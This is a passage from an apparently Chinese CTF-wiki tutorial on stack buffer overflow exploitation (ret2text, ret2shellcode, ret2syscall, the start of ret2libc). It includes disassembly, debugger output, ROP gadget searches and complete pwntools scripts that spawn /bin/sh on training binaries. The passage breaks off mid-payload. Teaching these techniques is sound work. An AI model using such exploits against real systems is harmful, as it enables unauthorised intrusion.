<span class="nl">.text:</span><span class="err">080485</span><span class="nf">FD</span>
<span class="nl">.text:</span><span class="err">080485</span><span class="nf">FD</span> <span class="no">input</span>           <span class="err">=</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">-</span><span class="mi">10</span><span class="no">h</span>
<span class="nl">.text:</span><span class="err">080485</span><span class="nf">FD</span> <span class="no">secretcode</span>      <span class="err">=</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">-</span><span class="mi">0</span><span class="no">Ch</span>
<span class="nl">.text:</span><span class="err">080485</span><span class="nf">FD</span>
<span class="nl">.text:</span><span class="err">080485</span><span class="nf">FD</span>                 <span class="no">push</span>    <span class="no">ebp</span>
<span class="nl">.text:</span><span class="err">080485</span><span class="nf">FE</span>                 <span class="no">mov</span>     <span class="no">ebp</span><span class="p">,</span> <span class="no">esp</span>
<span class="nl">.text:</span><span class="err">08048600</span>                 <span class="nf">sub</span>     <span class="no">esp</span><span class="p">,</span> <span class="mi">28</span><span class="no">h</span>
<span class="nl">.text:</span><span class="err">08048603</span>                 <span class="nf">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="mi">0</span> <span class="c">; timer</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">0804860</span><span class="no">A</span>                 <span class="no">call</span>    <span class="no">_time</span>
<span class="nl">.text:</span><span class="err">0804860</span><span class="nf">F</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="no">eax</span>      <span class="c">; seed</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">08048612</span>                 <span class="no">call</span>    <span class="no">_srand</span>
<span class="nl">.text:</span><span class="err">08048617</span>                 <span class="nf">call</span>    <span class="no">_rand</span>
<span class="nl">.text:</span><span class="err">0804861</span><span class="nf">C</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">secretcode</span><span class="p">],</span> <span class="no">eax</span>
<span class="nl">.text:</span><span class="err">0804861</span><span class="nf">F</span>                 <span class="no">lea</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">input</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">08048622</span>                 <span class="nf">mov</span>     <span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">4</span><span class="p">],</span> <span class="no">eax</span>
<span class="nl">.text:</span><span class="err">08048626</span>                 <span class="nf">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="no">offset</span> <span class="no">unk_8048760</span>
<span class="nl">.text:</span><span class="err">0804862</span><span class="nf">D</span>                 <span class="no">call</span>    <span class="no">___isoc99_scanf</span>
<span class="nl">.text:</span><span class="err">08048632</span>                 <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">input</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">08048635</span>                 <span class="nf">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="no">secretcode</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">08048638</span>                 <span class="nf">jnz</span>     <span class="no">short</span> <span class="no">locret_8048646</span>
<span class="nl">.text:</span><span class="err">0804863</span><span class="nf">A</span>                 <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="no">offset</span> <span class="no">command</span> <span class="c">; &quot;/bin/sh&quot;</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">08048641</span>                 <span class="no">call</span>    <span class="no">_system</span>
</pre></div>

<p>在secure函数又发现了存在调用system("/bin/sh")的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到系统的shell了。</p>
<p>下面就是我们如何构造payload了，首先需要确定的是我们能够控制的内存地址距离main函数的返回地址的字节数。</p>
<div class="codehilite"><pre><span></span><span class="nl">.text:</span><span class="err">080486</span><span class="nf">A7</span>                 <span class="no">lea</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">esp</span><span class="err">+</span><span class="mi">1</span><span class="no">Ch</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">080486</span><span class="nf">AB</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">esp</span><span class="p">],</span> <span class="no">eax</span>      <span class="c">; s</span>
<span class="no">.text</span><span class="p">:</span><span class="mi">080486</span><span class="no">AE</span>                 <span class="no">call</span>    <span class="no">_gets</span>
</pre></div>

<p>可以看到该字符串是通过相对于esp的索引，所以我们需要进行调试，将断点下在call处，查看esp，ebp，如下</p>
<div class="codehilite"><pre><span></span>gef➤  b *0x080486AE
Breakpoint <span class="m">1</span> at 0x80486ae: file ret2text.c, line <span class="m">24</span>.
gef➤  r
There is something amazing here, <span class="k">do</span> you know anything?

Breakpoint <span class="m">1</span>, 0x080486ae in main <span class="o">()</span> at ret2text.c:24
<span class="m">24</span>      gets<span class="o">(</span>buf<span class="o">)</span><span class="p">;</span>
───────────────────────────────────────────────────────────────────────<span class="o">[</span> registers <span class="o">]</span>────
<span class="nv">$eax</span>   : 0xffffcd5c  →  0x08048329  →  <span class="s2">&quot;__libc_start_main&quot;</span>
<span class="nv">$ebx</span>   : 0x00000000
<span class="nv">$ecx</span>   : 0xffffffff
<span class="nv">$edx</span>   : 0xf7faf870  →  0x00000000
<span class="nv">$esp</span>   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  <span class="s2">&quot;__libc_start_main&quot;</span>
<span class="nv">$ebp</span>   : 0xffffcdc8  →  0x00000000
<span class="nv">$esi</span>   : 0xf7fae000  →  0x001b1db0
<span class="nv">$edi</span>   : 0xf7fae000  →  0x001b1db0
<span class="nv">$eip</span>   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
</pre></div>

<p>可以看到esp为0xffffcd40，ebp为具体的payload如下0xffffcdc8，同时s相对于esp的索引为[esp+0x1c]，所以，s的地址为0xffffcd5c，所以s相对于ebp的偏移为0x6C，所以相对于返回地址的偏移为0x6c+4。</p>
<p>最后的payload如下：</p>
<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2text&#39;</span><span class="p">)</span>
<span class="n">target</span> <span class="o">=</span> <span class="mh">0x804863a</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<h3 id="_3">题目<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<h2 id="ret2shellcode">ret2shellcode<a class="headerlink" href="#ret2shellcode" title="Permanent link">&para;</a></h2>
<h3 id="_4">原理<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>ret2shellcode需要我们控制程序执行shellcode代码。而所谓的shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>一般来说，shellcode都需要我们自己去填充。这其实是另外一种典型的利用的方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>
<p>而在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行shellcode，需要对应的binary文件没有开启NX保护。</p>
<h3 id="_5">例子<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>这里我们以bamboofox中的ret2shellcode为例  </p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2shellcode/ret2shellcode">ret2shellcode</a></p>
<p>首先检测程序开启的保护</p>
<div class="codehilite"><pre><span></span>➜  ret2shellcode checksec ret2shellcode
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
    RWX:      Has RWX segments
</pre></div>

<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。我们再使用IDA看一下程序</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-64h]@1</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;No system for you this time !!!&quot;</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
  <span class="n">strncpy</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">,</span> <span class="mh">0x64u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;bye bye ~&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处。简单查看可知buf2在bss段。</p>
<div class="codehilite"><pre><span></span><span class="nl">.bss:</span><span class="err">0804</span><span class="nf">A080</span>                 <span class="no">public</span> <span class="no">buf2</span>
<span class="nl">.bss:</span><span class="err">0804</span><span class="nf">A080</span> <span class="c">; char buf2[100]</span>
</pre></div>

<p>这时，我们简单的调试下程序，看看这一个bss段是否可执行。</p>
<div class="codehilite"><pre><span></span>gef➤  b main
Breakpoint <span class="m">1</span> at 0x8048536: file ret2shellcode.c, line <span class="m">8</span>.
gef➤  r
Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode 

Breakpoint <span class="m">1</span>, main <span class="o">()</span> at ret2shellcode.c:8
<span class="m">8</span>       setvbuf<span class="o">(</span>stdout, 0LL, <span class="m">2</span>, 0LL<span class="o">)</span><span class="p">;</span>
─────────────────────────────────────────────────────────────────────<span class="o">[</span> source:ret2shellcode.c+8 <span class="o">]</span>────
      <span class="m">6</span>  int main<span class="o">(</span>void<span class="o">)</span>
      <span class="m">7</span>  <span class="o">{</span>
 →    <span class="m">8</span>      setvbuf<span class="o">(</span>stdout, 0LL, <span class="m">2</span>, 0LL<span class="o">)</span><span class="p">;</span>
      <span class="m">9</span>      setvbuf<span class="o">(</span>stdin, 0LL, <span class="m">1</span>, 0LL<span class="o">)</span><span class="p">;</span>
     <span class="m">10</span>  
─────────────────────────────────────────────────────────────────────<span class="o">[</span> trace <span class="o">]</span>────
<span class="o">[</span><span class="c1">#0] 0x8048536 → Name: main()</span>
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  vmmap 
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 0x00000000 rwx 
0xf7fd3000 0xf7fd5000 0x00000000 rwx 
0xf7fd5000 0xf7fd7000 0x00000000 r-- <span class="o">[</span>vvar<span class="o">]</span>
0xf7fd7000 0xf7fd9000 0x00000000 r-x <span class="o">[</span>vdso<span class="o">]</span>
0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 0x00000000 rwx 
0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 0x00000000 rwx <span class="o">[</span>stack<span class="o">]</span>
</pre></div>

<p>通过vmmap，我们可以看到bss段对应的段具有可执行权限</p>
<div class="codehilite"><pre><span></span>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode
</pre></div>

<p>那么这次我们就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bss段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。</p>
<p>具体的payload如下</p>
<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2shellcode&#39;</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="n">buf2_addr</span> <span class="o">=</span> <span class="mh">0x804a080</span>

<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">112</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2_addr</span><span class="p">))</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<h3 id="_6">题目<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<ul>
<li>sniperoj-pwn100-shellcode-x86-64</li>
</ul>
<h2 id="ret2syscall">ret2syscall<a class="headerlink" href="#ret2syscall" title="Permanent link">&para;</a></h2>
<h3 id="_7">原理<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>ret2syscall需要我们控制程序执行系统调用，获取shell。</p>
<h3 id="_8">例子<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p>这里我们以bamboofox中的ret2syscall为例  </p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2syscall/rop">ret2syscall</a></p>
<p>首先检测程序开启的保护</p>
<div class="codehilite"><pre><span></span>➜  ret2syscall checksec rop
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</pre></div>

<p>可以看出，源程序为32位，开启了NX保护。接下来利用IDA来查看源码</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-64h]@1</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What do you plan to do?&quot;</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以我们需要覆盖的返回地址相对于v4的偏移为112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。关于系统调用的知识，请参考</p>
<ul>
<li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li>
</ul>
<p>简单地说，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行int 0x80就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取shell</p>
<div class="codehilite"><pre><span></span><span class="n">execve</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">)</span>
</pre></div>

<p>其中，该程序是32位，所以我们需要使得</p>
<ul>
<li>系统调用号即eax应该为0xb</li>
<li>第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以</li>
<li>第二个参数即ecx应该为0</li>
<li>第三个参数edx应该为0</li>
</ul>
<p>而我们如何控制这些寄存器的值 呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在gadgets最后使用ret来再次控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。</p>
<p>首先，我们来寻找控制eax的gadgets</p>
<div class="codehilite"><pre><span></span>➜  ret2syscall ROPgadget --binary rop  --only <span class="s1">&#39;pop|ret&#39;</span> <span class="p">|</span> grep <span class="s1">&#39;eax&#39;</span>
0x0809ddda : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x080bb196 : pop eax <span class="p">;</span> ret
0x0807217a : pop eax <span class="p">;</span> ret 0x80e
0x0804f704 : pop eax <span class="p">;</span> ret <span class="m">3</span>
0x0809ddd9 : pop es <span class="p">;</span> pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
</pre></div>

<p>可以看到有上述几个都可以控制eax，那我就选取第二个来作为我的gadgets。</p>
<p>类似的，我们可以得到控制其它寄存器的gadgets</p>
<div class="codehilite"><pre><span></span>➜  ret2syscall ROPgadget --binary rop  --only <span class="s1">&#39;pop|ret&#39;</span> <span class="p">|</span> grep <span class="s1">&#39;ebx&#39;</span>
0x0809dde2 : pop ds <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x0809ddda : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x0805b6ed : pop ebp <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x0809e1d4 : pop ebx <span class="p">;</span> pop ebp <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x080be23f : pop ebx <span class="p">;</span> pop edi <span class="p">;</span> ret
0x0806eb69 : pop ebx <span class="p">;</span> pop edx <span class="p">;</span> ret
0x08092258 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop ebp <span class="p">;</span> ret
0x0804838b : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
0x080a9a42 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0x10
0x08096a26 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0x14
0x08070d73 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret 0xc
0x0805ae81 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret <span class="m">4</span>
0x08049bfd : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret <span class="m">8</span>
0x08048913 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x08049a19 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret <span class="m">4</span>
0x08049a94 : pop ebx <span class="p">;</span> pop esi <span class="p">;</span> ret
0x080481c9 : pop ebx <span class="p">;</span> ret
0x080d7d3c : pop ebx <span class="p">;</span> ret 0x6f9
0x08099c87 : pop ebx <span class="p">;</span> ret <span class="m">8</span>
0x0806eb91 : pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
0x0806336b : pop edi <span class="p">;</span> pop esi <span class="p">;</span> pop ebx <span class="p">;</span> ret
0x0806eb90 : pop edx <span class="p">;</span> pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
0x0809ddd9 : pop es <span class="p">;</span> pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
0x0806eb68 : pop esi <span class="p">;</span> pop ebx <span class="p">;</span> pop edx <span class="p">;</span> ret
0x0805c820 : pop esi <span class="p">;</span> pop ebx <span class="p">;</span> ret
0x08050256 : pop esp <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> pop ebp <span class="p">;</span> ret
0x0807b6ed : pop ss <span class="p">;</span> pop ebx <span class="p">;</span> ret
</pre></div>

<p>这里，我选择</p>
<div class="codehilite"><pre><span></span>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret
</pre></div>

<p>这个可以直接控制其它三个寄存器。</p>
<p>此外，我们需要获得/bin/sh字符串对应的地址。</p>
<div class="codehilite"><pre><span></span>➜  ret2syscall ROPgadget --binary rop  --string <span class="s1">&#39;/bin/sh&#39;</span> 
Strings <span class="nv">information</span>
<span class="o">============================================================</span>
0x080be408 : /bin/sh
</pre></div>

<p>可以找到对应的地址，此外，还有int 0x80的地址，如下</p>
<div class="codehilite"><pre><span></span>➜  ret2syscall ROPgadget --binary rop  --only &#39;int&#39;                 
Gadgets information
============================================================
0x08049421 : int 0x80
0x080938fe : int 0xbb
0x080869b5 : int 0xf6
0x0807b4d4 : int 0xfc

Unique gadgets found: 4
</pre></div>

<p>同时，也找到对应的地址了。</p>
<p>下面就是对应的payload,其中0xb为execve对应的系统调用号。</p>
<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./rop&#39;</span><span class="p">)</span>

<span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
<span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
<span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="mh">0x80be408</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
    <span class="p">[</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">112</span><span class="p">,</span> <span class="n">pop_eax_ret</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="n">pop_edx_ecx_ebx_ret</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">binsh</span><span class="p">,</span> <span class="n">int_0x80</span><span class="p">])</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<h3 id="_9">题目<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<h2 id="ret2libc">ret2libc<a class="headerlink" href="#ret2libc" title="Permanent link">&para;</a></h2>
<h3 id="_10">原理<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p>ret2libc即控制函数的执行 libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。一般情况下，我们会选择执行system("/bin/sh")，故而此时我们需要知道system函数的地址。</p>
<h3 id="_11">例子<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<p>我们由简单到难分别给出三个例子。</p>
<h4 id="1">例1<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
<p>这里我们以bamboofox中ret2libc1为例  </p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2libc1/ret2libc1">ret2libc1</a></p>
<p>首先，我们可以检查一下程序的安全保护</p>
<div class="codehilite"><pre><span></span>➜  ret2libc1 checksec ret2libc1    
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</pre></div>

<p>源程序为32位，开启了NX保护。下面来看一下程序源代码，确定漏洞位置</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-64h]@1</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;RET2LIBC &gt;_&lt;&quot;</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>可以看到在执行gets函数的时候出现了栈溢出。此外，利用ropgadget，我们可以查看是否有/bin/sh存在</p>
<div class="codehilite"><pre><span></span>➜  ret2libc1 ROPgadget --binary ret2libc1 --string <span class="s1">&#39;/bin/sh&#39;</span>          
Strings <span class="nv">information</span>
<span class="o">============================================================</span>
0x08048720 : /bin/sh
</pre></div>

<p>确实存在，再次查找一下是否有system函数存在。经在ida中查找，确实也存在。</p>
<div class="codehilite"><pre><span></span><span class="nl">.plt:</span><span class="err">08048460</span> <span class="c">; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span>
</pre></div>

<p>那么，我们直接返回该处，即执行system函数。相应的payload如下</p>
<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2libc1&#39;</span><span class="p">)</span>

<span class="n">binsh_addr</span> <span class="o">=</span> <span class="mh">0x8048720</span>
<span class="n">system_plt</span> <span class="o">=</span> <span class="mh">0x08048460</span>
